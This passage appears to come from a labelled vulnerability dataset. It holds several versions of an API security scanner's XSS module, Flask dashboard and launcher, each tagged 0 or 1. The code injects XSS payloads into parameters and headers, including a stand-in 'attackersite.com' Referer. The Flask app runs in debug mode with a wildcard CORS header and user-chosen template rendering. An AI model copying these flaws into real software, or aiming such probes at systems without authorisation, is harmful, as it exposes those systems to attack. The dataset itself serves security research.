XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                            if db_update is not True:\n                                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                                dbupdate.insert_record(attack_result)\n                                result,db_update = True,True\n                                vul_param += key\n                            else:\n                                result = True\n                                if vul_param == '':\n                                    vul_param += key\n                                else:\n                                    vul_param += ','+key                  \n        \n            except:\n                logs.logging.info(\"XSS: No GET param found!\")\n\n        if vul_param:\n            # Update all vulnerable params to db.\n            dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : vul_param+\" are vulnerable to XSS\"}})\n\n\ndef xss_check(url,method,headers,body,scanid):\n    # Main function for XSS attack\n    if method == 'GET' or method == 'DEL':\n        xss_get_uri(url,method,headers,body,scanid)\n        xss_get_url(url,method,headers,body,scanid)\n    \n    xss_http_headers(url,method,headers,body,scanid)/n/n/n", "label": 0}, {"id": "1611d2eb1cf40451f5c99ba6dc146d3ab11a54a1", "code": "/modules/xss.py/n/nimport os\nimport urlparse\nimport sendrequest as req\nimport utils.logs as logs\nimport urlparse\n\nfrom utils.logger import logger\nfrom utils.db import Database_update\nfrom utils.config import get_value\n\ndbupdate = Database_update()\napi_logger = logger()\n\ndef fetch_xss_payload():\n    # Returns xss payloads in list type\n    payload_list = []\n    if os.getcwd().split('/')[-1] == 'API':\n        path = '../Payloads/xss.txt'\n    else:\n        path = 'Payloads/xss.txt'\n\n    with open(path) as f:\n        for line in f:\n            if line:\n                payload_list.append(line.rstrip())\n\n    return payload_list\n\ndef check_xss_impact(res_headers):\n    # Return the impact of XSS based on content-type header\n    if res_headers['Content-Type']:\n        if 'application/json' or 'text/plain' in xss_request['Content-Type']:\n            # Possible XSS \n            impact = \"Low\"\n        else:\n            impact = \"High\"\n    else:\n        impact = \"Low\"\n\n    return impact\n\n\ndef xss_get_url(url,method,headers,body,scanid=None):\n    # Check for URL based XSS. Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>\n    xss_result = ''\n    xss_payloads = fetch_xss_payload()\n    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']\n    for uri_list in uri_check_list:\n        if uri_list in url:\n            # Parse domain name from URI.\n            parsed_url = urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path\n            break\n\n    if parsed_url == '':\n        parsed_url = url\n\n    for payload in xss_payloads:\n            xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n            if xss_request_url.text.find(payload) != -1:\n                impact = check_xss_impact(xss_request_url.headers)\n                xss_result = True\n\n            xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n            if xss_request_url.text.find(payload) != -1:\n                impact = check_xss_impact()\n                xss_result = True\n\n            if xss_result is True:\n                print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                dbupdate.insert_record(attack_result)\n                return\n\ndef xss_get_uri(url,method,headers,body,scanid=None):\n    # Test for XSS in GET param\n    db_update = ''\n    vul_param = ''\n    url_query = urlparse.urlparse(url)\n    parsed_query = urlparse.parse_qs(url_query.query)\n    if parsed_query:\n        for key,value in parsed_query.items():\n            try:\n                result = ''\n                logs.logging.info(\"GET param for xss : %s\",key)\n                xss_payloads = fetch_xss_payload()\n                for payload in xss_payloads:\n                    # check for URI based XSS\n                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>\n                    if result is not True:\n                        print \"param to test\",key\n                        parsed_url = urlparse.urlparse(url)\n                        xss_url = parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload)\n                        xss_request = req.api_request(xss_url,\"GET\",headers)\n                        print xss_request.text\n                        if xss_request.text.find(payload) != -1:\n                            impact = check_xss_impact(xss_request.headers)\n                            logs.logging.info(\"%s is vulnerable to XSS\",url)\n                            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                            if db_update is not True:\n                                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                                dbupdate.insert_record(attack_result)\n                                result,db_update = True,True\n                                vul_param += key\n                            else:\n                                result = True\n                                if vul_param == '':\n                                    vul_param += key\n                                else:\n                                    vul_param += ','+key                  \n        \n            except:\n                logs.logging.info(\"XSS: No GET param found!\")\n\n        print \"all params\",vul_param\n\n\ndef xss_check(url,method,headers,body,scanid):\n    # Main function for XSS attack\n    if method == 'GET' or method == 'DEL':\n        xss_get_uri(url,method,headers,body,scanid)\n        xss_get_url(url,method,headers,body,scanid)\n        #xss_http_headers(url,method,headers,body,scanid)/n/n/n", "label": 1}, {"id": "ee32dd65ddddc6dfefcf012def42eb1a3ae23e66", "code": "API/api.py/n/nimport ast\nimport json\nimport sys\nimport hashlib\nimport time\n\nsys.path.append('../')\n\nfrom flask import Flask,render_template\nfrom flask import Response,make_response\nfrom flask import request\nfrom flask import Flask\nfrom astra import scan_single_api\nfrom flask import jsonify\nfrom pymongo import MongoClient\nfrom utils.vulnerabilities import alerts\n \napp = Flask(__name__,template_folder='../Dashboard/templates',static_folder='../Dashboard/static')\n \n# Mongo DB connection \nclient = MongoClient('localhost',27017)\nglobal db\ndb = client.apiscan\n\n\n############################# Start scan API ######################################\ndef generate_hash():\n    # Return md5 hash value of current timestmap \n    scanid = hashlib.md5(str(time.time())).hexdigest()\n    return scanid\n\n# Start the scan and returns the message\n@app.route('/scan/', methods = ['POST'])\ndef start_scan():\n    scanid = generate_hash()\n    content = request.get_json()\n    try:\n        name = content['appname']\n        url = content['url']\n        headers = content['headers']\n        body = content['body']\n        method = content['method']\n        api = \"Y\"\n        scan_status = scan_single_api(url, method, headers, body, api, scanid)\n        if scan_status is True:\n            # Success\n            msg = {\"status\" : scanid}\n            try:\n                db.scanids.insert({\"scanid\" : scanid, \"name\" : name, \"url\" : url})\n            except:\n                print \"Failed to update DB\"\n        else:\n            msg = {\"status\" : \"Failed\"}\n    \n    except:\n        msg = {\"status\" : \"Failed\"} \n    \n    return jsonify(msg)\n\n\n#############################  Fetch ScanID API #########################################\n@app.route('/scan/scanids/', methods=['GET'])\ndef fetch_scanids():\n    scanids = []\n    records = db.scanids.find({})\n    if records:\n        for data in records:\n            data.pop('_id')\n            try:\n                data =  ast.literal_eval(json.dumps(data))\n                if data['scanid']:\n                    if data['scanid'] not in scanids:\n                        scanids.append({\"scanid\" : data['scanid'], \"name\" : data['name'], \"url\" : data['url']}) \n            except:\n                pass\n\n        return jsonify(scanids)\n############################# Alerts API ##########################################\n\n# Returns vulnerbilities identified by tool \ndef fetch_records(scanid):\n    # Return alerts identified by the tool\n    vul_list = []\n    records = db.vulnerabilities.find({\"scanid\":scanid})\n    print \"Records are \",records\n    if records:\n        for data in records:  \n            print \"Data is\",data\n            if data['req_body'] == None:\n                data['req_body'] = \"NA\" \n\n            data.pop('_id')\n            try:\n                data =  ast.literal_eval(json.dumps(data))\n            except:\n                print \"Falied to parse\"\n\n            print \"Data\",data\n            try:\n                if data['id'] == \"NA\":\n                    all_data = {'url' : data['url'], 'impact' : data['impact'], 'name' : data['name'], 'req_headers' : data['req_headers'], 'req_body' : data['req_body'], 'res_headers' : data['res_headers'], 'res_body' : data['res_body'], 'Description' : data['Description'], 'remediation' : data['remediation']}\n                    vul_list.append(all_data)\n\n                if data['id']:\n                    for vul in alerts:\n                        if data['id'] == vul['id']:\n                            all_data = {\n                                        'url' : data['url'],\n                                        'impact' : data['impact'],\n                                        'name' : data['alert'],\n                                        'req_headers' : data['req_headers'],\n                                        'req_body' : data['req_body'],\n                                        'res_headers' : data['res_headers'],\n                                        'res_body' : data['res_body'],\n                                        'Description' : vul['Description'],\n                                        'remediation' : vul['remediation']\n                                        }\n                            vul_list.append(all_data)\n                            break\n\n            except:\n                pass\n\n        print vul_list\n        return vul_list\n        \n\n@app.route('/alerts/<scanid>', methods=['GET'])\ndef return_alerts(scanid):\n    print \"ScanID is \",scanid\n    result = fetch_records(scanid)\n    resp = jsonify(result)\n    resp.headers[\"Access-Control-Allow-Origin\"] = \"*\"\n    return resp\n\n#############################Dashboard#########################################\n\n@app.route('/', defaults={'page': 'scan.html'})\n@app.route('/<page>')\ndef view_dashboard(page):\n    return render_template('{}'.format(page))\n\napp.run(host='0.0.0.0', port= 8094,debug=True)\n/n/n/nastra.py/n/nimport argparse\nimport base64\nimport json\nimport requests\nimport time\nimport ast\nimport utils.logger as logger\nimport utils.logs as logs\nimport urlparse\n\n\nfrom core.zapscan import *\nfrom core.parsers import *\nfrom utils.logger import *\nfrom core.login import APILogin\nfrom utils.logger import logger\nfrom utils.config import update_value,get_value,get_allvalues\nfrom modules.cors import cors_main\nfrom modules.auth import auth_check\nfrom modules.rate_limit import rate_limit\nfrom modules.csrf import csrf_check\nfrom modules.jwt_attack import jwt_check\nfrom modules.sqli import sqli_check\nfrom modules.xss import xss_check\nfrom core.zap_config import zap_start\nfrom multiprocessing import Process\n\n\ndef parse_collection(collection_name,collection_type):\n    if collection_type == 'Postman':\n        parse_data.postman_parser(collection_name)\n    elif collection_type == 'Swagger':\n        print collection_type\n    else:\n        print \"[-]Failed to Parse collection\"\n        sys.exit(1)\n\ndef add_headers(headers):\n    # This function deals with adding custom header and auth value .\n    get_auth = get_value('config.property','login','auth_type')\n    if get_auth == 'cookie':\n        cookie = get_value('config.property','login','auth')\n        cookie_dict = ast.literal_eval(cookie)\n        cookie_header = {'Cookie': cookie_dict['cookie']}\n        headers.update(cookie_header)\n    try:\n        custom_header = get_value('config.property','login','headers')\n        custom_header = ast.literal_eval(custom_header)\n        headers.update(custom_header)\n    except:\n        pass\n\n    return headers\n\ndef generate_report():\n    # Generating report once the scan is complete.\n    result = api_scan.generate_report()\n    if result is True:\n        print \"%s[+]Report is generated successfully%s\"% (api_logger.G, api_logger.W)\n    else:\n        print \"%s[-]Failed to generate a report%s\"% (api_logger.R, api_logger.W)\n\n\ndef read_scan_policy():\n    try:\n        scan_policy = get_value('scan.property','scan-policy','attack')\n        attack = ast.literal_eval(scan_policy)\n\n    except Exception as e:\n        print e\n        print \"Failed to parse scan property file.\"\n\n    return attack\n\ndef modules_scan(url,method,headers,body,scanid=None):\n    '''Scanning API using different engines '''\n    attack = read_scan_policy()\n    if attack is None:\n        print \"Failed to start scan.\"\n        sys.exit(1)\n\n    if attack['zap'] == \"Y\" or attack['zap'] == \"y\":\n        api_scan = zap_scan()\n        status = zap_start()\n        if status is True:\n            api_scan.start_scan(url,method,headers,body,scanid)\n    \n    # Custom modules scan      \n    if attack['cors'] == 'Y' or attack['cors'] == 'y':\n        cors_main(url,method,headers,body,scanid)\n    if attack['Broken auth'] == 'Y' or attack['Broken auth'] == 'y':\n        auth_check(url,method,headers,body,scanid)\n    if attack['Rate limit'] == 'Y' or attack['Rate limit'] == 'y':\n        rate_limit(url,method,headers,body,scanid)\n    if attack['csrf'] == 'Y' or attack['csrf'] == 'y':\n        csrf_check(url,method,headers,body,scanid)\n    if attack['jwt'] == 'Y' or attack['jwt'] == 'y':\n        jwt_check(url,method,headers,body,scanid)\n    if attack['sqli'] == 'Y' or attack['sqli'] == 'y':\n        sqli_check(url,method,headers,body,scanid)\n    if attack['xss'] == 'Y' or attack['xss'] == 'y':\n        xss_check(url,method,headers,body,scanid)\n\ndef validate_data(url,method):\n    ''' Validate HTTP request data and return boolean value'''\n    validate_url = urlparse.urlparse(url)\n    http_method = ['GET','POST','DEL','OPTIONS','PUT']\n    if method in http_method and bool(validate_url.scheme) is True:\n        validate_result = True\n    else:\n        validate_result = False\n\n    return validate_result\n\ndef scan_single_api(url, method, headers, body, api, scanid=None):\n    ''' This function deals with scanning a single API. '''\n    if headers is None or headers == '':\n            headers = {'Content-Type' : 'application/json'}\n    if type(headers) is not dict:\n        headers = ast.literal_eval(headers)\n    if method == '':\n        method = 'GET'\n\n    result = validate_data(url, method)\n    if result is False:\n        print \"[-]Invalid Arguments\"\n        return False\n\n    p = Process(target=modules_scan,args=(url,method,headers,body,scanid),name='module-scan')\n    p.start()\n    if api == \"Y\":\n        return True\n\n\ndef scan_core(collection_type,collection_name,url,headers,method,body,loginurl,loginheaders,logindata,login_require):\n    ''' Scan API through different engines ''' \n    if collection_type and collection_name is not None:\n        parse_collection(collection_name,collection_type)\n        if login_require is True:\n            api_login.verify_login(parse_data.api_lst)\n        msg = True\n        for data in parse_data.api_lst:\n            try:\n                url = data['url']['raw']\n            except:\n                url = data['url']\n            headers,method,body = data['headers'],data['method'],''\n            if headers:\n                try:\n                    headhers = add_headers(headers)\n                except:\n                    pass\n\n            if data['body'] != '':\n                body = json.loads(base64.b64decode(data['body']))\n\n            \n            modules_scan(url,method,headers,body,attack)        \n\n    else:\n        print \"%s [-]Invalid Collection. Please recheck collection Type/Name %s\" %(api_logger.G, api_logger.W)\n    #generate_report()\n\ndef get_arg(args=None):\n        parser = argparse.ArgumentParser(description='REST API Security testing Framework')\n        parser.add_argument('-c', '--collection_type',\n                            help='Type of API collection',\n                            default='Postman',choices=('Postman', 'Swagger'))\n        parser.add_argument('-n', '--collection_name',\n                            help='Type of API collection')\n        parser.add_argument('-u', '--url',\n                            help='URL of target API')\n        parser.add_argument('-headers', '--headers',\n                            help='Custom headers.Example: {\"token\" : \"123\"}')\n        parser.add_argument('-method', '--method',\n                            help='HTTP request method',\n                            default='GET',choices=('GET', 'POST'))\n        parser.add_argument('-b', '--body',\n                            help='Request body of API')\n        parser.add_argument('-l', '--loginurl',\n                            help='URL of login API')\n        parser.add_argument('-H', '--loginheaders',\n                            help='Headers should be in a dictionary format. Example: {\"accesstoken\" : \"axzvbqdadf\"}')\n        parser.add_argument('-d', '--logindata',\n                            help='login data of API')\n    \n\n        results = parser.parse_args(args)\n        if len(args) == 0:\n            print \"%sAt least one argument is needed to procced.\\nFor further information check help: %spython astra.py --help%s\"% (api_logger.R, api_logger.G, api_logger.W)\n            sys.exit(1)\n\n        return (results.collection_type,\n                results.collection_name,\n                results.url,\n                results.headers,\n                results.method,\n                results.body,\n                results.loginurl,\n                results.loginheaders,\n                results.logindata,\n                )\n\ndef main():\n    collection_type,collection_name,url,headers,method,body,loginurl,loginheaders,logindata = get_arg(sys.argv[1:])\n    if loginheaders is None:\n            loginheaders = {'Content-Type' : 'application/json'}\n    if collection_type and collection_name and loginurl and loginmethod and logindata:\n        # Login data is given as an input. \n        api_login.fetch_logintoken(loginurl,loginmethod,loginheaders,logindata)\n        login_require = False\n    elif collection_type and collection_name and loginurl:\n        # This will first find the given loginurl from collection and it will fetch auth token. \n        parse_collection(collection_name,collection_type)\n        try:\n            loginurl,lognheaders,loginmethod,logidata = api_login.parse_logindata(loginurl)\n        except:\n           print \"[-]%s Failed to detect login API from collection %s \" %(api_logger.R, api_logger.W)\n           sys.exit(1)\n        api_login.fetch_logintoken(loginurl,loginmethod,loginheaders,logindata)\n        login_require = False\n    elif loginurl and loginmethod:\n        api_login.fetch_logintoken(loginurl,loginmethod,loginheaders,logindata)\n        login_require = False\n    elif collection_type and collection_name and headers:\n        #Custom headers\n        update_value('login','header',headers)\n        login_require = False\n    elif url and collection_name and headers:\n        #Custom headers\n        update_value('login','header',headers)\n        login_require = False\n    elif url:\n        if headers is None:\n            headers = {'Content-Type' : 'application/json'}\n        if method is None:\n            method = \"GET\"\n       \n        login_require = False\n    else:\n        login_require = True\n\n    if body:\n        body = ast.literal_eval(body)\n\n    # Configuring ZAP before starting a scan\n    get_auth = get_value('config.property','login','auth_type')\n\n    if collection_type and collection_name is not None:\n        scan_core(collection_type,collection_name,url,headers,method,body,loginurl,loginheaders,logindata,login_require) \n    else:\n        scan_single_api(url, method, headers, body, \"False\")\n\n\nif __name__ == '__main__':\n    \n    api_login = APILogin()\n    parse_data = PostmanParser()\n    api_logger = logger()\n    api_logger.banner()\n    main()\n/n/n/nmodules/xss.py/n/nimport os\nimport urlparse\nimport sendrequest as req\nimport utils.logs as logs\nimport urlparse\nimport time\nimport urllib\n\nfrom utils.logger import logger\nfrom utils.db import Database_update\nfrom utils.config import get_value\n\ndbupdate = Database_update()\napi_logger = logger()\n\ndef fetch_xss_payload():\n    # Returns xss payloads in list type\n    payload_list = []\n    if os.getcwd().split('/')[-1] == 'API':\n        path = '../Payloads/xss.txt'\n    else:\n        path = 'Payloads/xss.txt'\n\n    with open(path) as f:\n        for line in f:\n            if line:\n                payload_list.append(line.rstrip())\n\n    return payload_list\n\ndef check_xss_impact(res_headers):\n    # Return the impact of XSS based on content-type header\n    print \"response header\",res_headers['Content-Type']\n    if res_headers['Content-Type']:\n        if res_headers['Content-Type'].find('application/json') != -1 or res_headers['Content-Type'].find('text/plain') != -1:\n            # Possible XSS \n            impact = \"Low\"\n        else:\n            impact = \"High\"\n    else:\n        impact = \"Low\"\n\n    return impact\n\n\ndef xss_payload_decode(payload):\n    # Return decoded payload of XSS. \n    decoded_payload = urllib.unquote(payload).decode('utf8').encode('ascii','ignore')\n    return decoded_payload\n\ndef xss_post_method(url,method,headers,body,scanid=None):\n    # This function checks XSS through POST method.\n    print url, headers,method,body\n    temp_body = {}\n    post_vul_param = ''\n    for key,value in body.items():\n        xss_payloads = fetch_xss_payload()\n        for payload in xss_payloads:\n            temp_body.update(body)\n            temp_body[key] = payload\n            print \"updated body\",temp_body\n            xss_post_request = req.api_request(url, \"POST\", headers, temp_body)\n            decoded_payload = xss_payload_decode(payload)\n            if xss_post_request.text.find(decoded_payload) != -1:\n                impact = check_xss_impact(xss_post.body)\n                if db_update is not True:\n                    attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                    dbupdate.insert_record(attack_result)\n                    db_update = True\n                    vul_param += key\n                else:\n                    result = True\n                    if vul_param == '':\n                        post_vul_param += key\n                    else:\n                        post_vul_param += ','+key \n\n    if post_vul_param:\n        dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : post_vul_param+\" are vulnerable to XSS\"}})\n\n\ndef xss_http_headers(url,method,headers,body,scanid=None):\n    # This function checks different header based XSS.\n    # XSS via Host header (Limited to IE)\n    # Reference : http://sagarpopat.in/2017/03/06/yahooxss/\n    temp_headers = {}\n    temp_headers.update(headers)\n    xss_payloads = fetch_xss_payload()\n    for payload in xss_payloads:\n        parse_domain = urlparse.urlparse(url).netloc\n        host_header = {\"Host\" : parse_domain + '/' + payload}\n        headers.update(host_header)\n        host_header_xss = req.api_request(url, \"GET\", headers)\n        decoded_payload = xss_payload_decode(payload)\n        if host_header_xss.text.find(decoded_payload) != -1:\n            impact = \"Low\"\n            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers ,\"res_body\": host_header_xss.text}\n            dbupdate.insert_record(attack_result)\n            break\n\n    # Test for Referer based XSS \n    for payload in xss_payloads:\n        referer_header_value = 'http://attackersite.com?test='+payload\n        referer_header = {\"Referer\" : referer_header_value}\n        temp_headers.update(referer_header)\n        ref_header_xss = req.api_request(url, \"GET\", temp_headers)\n        decoded_payload = xss_payload_decode(payload)\n        if ref_header_xss.text.find(decoded_payload) != -1:\n            print ref_header_xss.text\n            impact = check_xss_impact(temp_headers)\n            print \"%s[{0}] {1} is vulnerable to XSS via referer header%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers ,\"res_body\": ref_header_xss.text}\n            dbupdate.insert_record(attack_result)\n            return\n\n\ndef xss_get_url(url,method,headers,body,scanid=None):\n    # Check for URL based XSS. \n    # Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>\n    result = ''\n    xss_payloads = fetch_xss_payload()\n    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']\n    for uri_list in uri_check_list:\n        if uri_list in url:\n            # Parse domain name from URI.\n            parsed_url = urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path\n            break\n\n    if parsed_url == '':\n        parsed_url = url\n\n    for payload in xss_payloads:\n        xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n        if result is not True:\n            decoded_payload = xss_payload_decode(payload)\n            if xss_request_url.text.find(decoded_payload) != -1:\n                impact = check_xss_impact(xss_request_url.headers)\n                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n                dbupdate.insert_record(attack_result)\n                result = True\n\n        xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n        if xss_request_url.text.find(decoded_payload) != -1:\n            impact = check_xss_impact(xss_request_uri.headers)\n            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n            dbupdate.insert_record(attack_result)\n                \n\ndef xss_get_uri(url,method,headers,body,scanid=None):\n    # This function checks for URI based XSS. \n    # http://localhost/?firstname=<payload>&lastname=<payload>\n    db_update = ''\n    vul_param = ''\n    url_query = urlparse.urlparse(url)\n    parsed_query = urlparse.parse_qs(url_query.query)\n    if parsed_query:\n        for key,value in parsed_query.items():\n            try:\n                result = ''\n                logs.logging.info(\"GET param for xss : %s\",key)\n                xss_payloads = fetch_xss_payload()\n                for payload in xss_payloads:\n                    # check for URI based XSS\n                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>\n                    if result is not True:\n                        parsed_url = urlparse.urlparse(url)\n                        xss_url = parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload)\n                        xss_request = req.api_request(xss_url,\"GET\",headers)\n                        decoded_payload = xss_payload_decode(payload)\n                        print decoded_payload\n                        print xss_url\n                        if xss_request.text.find(decoded_payload) != -1:\n                            impact = check_xss_impact(xss_request.headers)\n                            logs.logging.info(\"%s is vulnerable to XSS\",url)\n                            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                            if db_update is not True:\n                                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                                dbupdate.insert_record(attack_result)\n                                result,db_update = True,True\n                                vul_param += key\n                            else:\n                                result = True\n                                if vul_param == '':\n                                    vul_param += key\n                                else:\n                                    vul_param += ','+key                  \n        \n            except:\n                logs.logging.info(\"XSS: No GET param found!\")\n\n        if vul_param:\n            # Update all vulnerable params to db.\n            print vul_param,scanid\n            dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : vul_param+\" parameters are vulnerable to XSS\"}})\n\n\ndef xss_check(url,method,headers,body,scanid):\n    # Main function for XSS attack\n    if method == 'GET' or method == 'DEL':\n        xss_get_uri(url,method,headers,body,scanid)\n        xss_get_url(url,method,headers,body,scanid)\n\n    if method == 'POST' or method == 'PUT':\n        xss_post_method(url,method,headers,body,scanid)\n\n    xss_http_headers(url,method,headers,body,scanid)/n/n/n", "label": 0}, {"id": "ee32dd65ddddc6dfefcf012def42eb1a3ae23e66", "code": "/API/api.py/n/nimport ast\nimport json\nimport sys\nimport hashlib\nimport time\n\nsys.path.append('../')\n\nfrom flask import Flask,render_template\nfrom flask import Response,make_response\nfrom flask import request\nfrom flask import Flask\nfrom apiscan import scan_single_api\nfrom flask import jsonify\nfrom pymongo import MongoClient\nfrom utils.vulnerabilities import alerts\n \napp = Flask(__name__,template_folder='../Dashboard/templates',static_folder='../Dashboard/static')\n \n# Mongo DB connection \nclient = MongoClient('localhost',27017)\nglobal db\ndb = client.apiscan\n\n\n############################# Start scan API ######################################\ndef generate_hash():\n    # Return md5 hash value of current timestmap \n    scanid = hashlib.md5(str(time.time())).hexdigest()\n    return scanid\n\n# Start the scan and returns the message\n@app.route('/scan/', methods = ['POST'])\ndef start_scan():\n    scanid = generate_hash()\n    content = request.get_json()\n    try:\n        name = content['appname']\n        url = content['url']\n        headers = content['headers']\n        body = content['body']\n        method = content['method']\n        api = \"Y\"\n        scan_status = scan_single_api(url, method, headers, body, api, scanid)\n        if scan_status is True:\n            # Success\n            msg = {\"status\" : scanid}\n            try:\n                db.scanids.insert({\"scanid\" : scanid, \"name\" : name, \"url\" : url})\n            except:\n                print \"Failed to update DB\"\n        else:\n            msg = {\"status\" : \"Failed\"}\n    \n    except:\n        msg = {\"status\" : \"Failed\"} \n    \n    return jsonify(msg)\n\n\n#############################  Fetch ScanID API #########################################\n@app.route('/scan/scanids/', methods=['GET'])\ndef fetch_scanids():\n    scanids = []\n    records = db.scanids.find({})\n    if records:\n        for data in records:\n            data.pop('_id')\n            try:\n                data =  ast.literal_eval(json.dumps(data))\n                if data['scanid']:\n                    if data['scanid'] not in scanids:\n                        scanids.append({\"scanid\" : data['scanid'], \"name\" : data['name'], \"url\" : data['url']}) \n            except:\n                pass\n\n        return jsonify(scanids)\n############################# Alerts API ##########################################\n\n# Returns vulnerbilities identified by tool \ndef fetch_records(scanid):\n    # Return alerts identified by the tool\n    vul_list = []\n    records = db.vulnerabilities.find({\"scanid\":scanid})\n    print \"Records are \",records\n    if records:\n        for data in records:  \n            print \"Data is\",data\n            if data['req_body'] == None:\n                data['req_body'] = \"NA\" \n\n            data.pop('_id')\n            try:\n                data =  ast.literal_eval(json.dumps(data))\n            except:\n                print \"Falied to parse\"\n\n            print \"Data\",data\n            try:\n                if data['id'] == \"NA\":\n                    all_data = {'url' : data['url'], 'impact' : data['impact'], 'name' : data['name'], 'req_headers' : data['req_headers'], 'req_body' : data['req_body'], 'res_headers' : data['res_headers'], 'res_body' : data['res_body'], 'Description' : data['Description'], 'remediation' : data['remediation']}\n                    vul_list.append(all_data)\n\n                if data['id']:\n                    for vul in alerts:\n                        if data['id'] == vul['id']:\n                            all_data = {\n                                        'url' : data['url'],\n                                        'impact' : data['impact'],\n                                        'name' : data['alert'],\n                                        'req_headers' : data['req_headers'],\n                                        'req_body' : data['req_body'],\n                                        'res_headers' : data['res_headers'],\n                                        'res_body' : data['res_body'],\n                                        'Description' : vul['Description'],\n                                        'remediation' : vul['remediation']\n                                        }\n                            vul_list.append(all_data)\n                            break\n\n            except:\n                pass\n\n        print vul_list\n        return vul_list\n        \n\n@app.route('/alerts/<scanid>', methods=['GET'])\ndef return_alerts(scanid):\n    print \"ScanID is \",scanid\n    result = fetch_records(scanid)\n    resp = jsonify(result)\n    resp.headers[\"Access-Control-Allow-Origin\"] = \"*\"\n    return resp\n\n#############################Dashboard#########################################\n\n@app.route('/', defaults={'page': 'scan.html'})\n@app.route('/<page>')\ndef view_dashboard(page):\n    return render_template('{}'.format(page))\n\napp.run(host='0.0.0.0', port= 8094,debug=True)\n/n/n/n", "label": 1}, {"id": "7b48dd5bd83353133ecbcc541b9fdc73cb0ce9a8", "code": "API/api.py/n/nimport ast\nimport json\nimport sys\nimport hashlib\nimport time\n\nsys.path.append('../')\n\nfrom flask import Flask,render_template\nfrom flask import Response,make_response\nfrom flask import request\nfrom flask import Flask\nfrom astra import scan_single_api\nfrom flask import jsonify\nfrom pymongo import MongoClient\nfrom utils.vulnerabilities import alerts\n \napp = Flask(__name__,template_folder='../Dashboard/templates',static_folder='../Dashboard/static')\n \n# Mongo DB connection \nclient = MongoClient('localhost',27017)\nglobal db\ndb = client.apiscan\n\n\n############################# Start scan API ######################################\ndef generate_hash():\n    # Return md5 hash value of current timestmap \n    scanid = hashlib.md5(str(time.time())).hexdigest()\n    return scanid\n\n# Start the scan and returns the message\n@app.route('/scan/', methods = ['POST'])\ndef start_scan():\n    scanid = generate_hash()\n    content = request.get_json()\n    try:\n        name = content['appname']\n        url = content['url']\n        headers = content['headers']\n        body = content['body']\n        method = content['method']\n        api = \"Y\"\n        scan_status = scan_single_api(url, method, headers, body, api, scanid)\n        if scan_status is True:\n            # Success\n            msg = {\"status\" : scanid}\n            try:\n                db.scanids.insert({\"scanid\" : scanid, \"name\" : name, \"url\" : url})\n            except:\n                print \"Failed to update DB\"\n        else:\n            msg = {\"status\" : \"Failed\"}\n    \n    except:\n        msg = {\"status\" : \"Failed\"} \n    \n    return jsonify(msg)\n\n\n#############################  Fetch ScanID API #########################################\n@app.route('/scan/scanids/', methods=['GET'])\ndef fetch_scanids():\n    scanids = []\n    records = db.scanids.find({})\n    if records:\n        for data in records:\n            data.pop('_id')\n            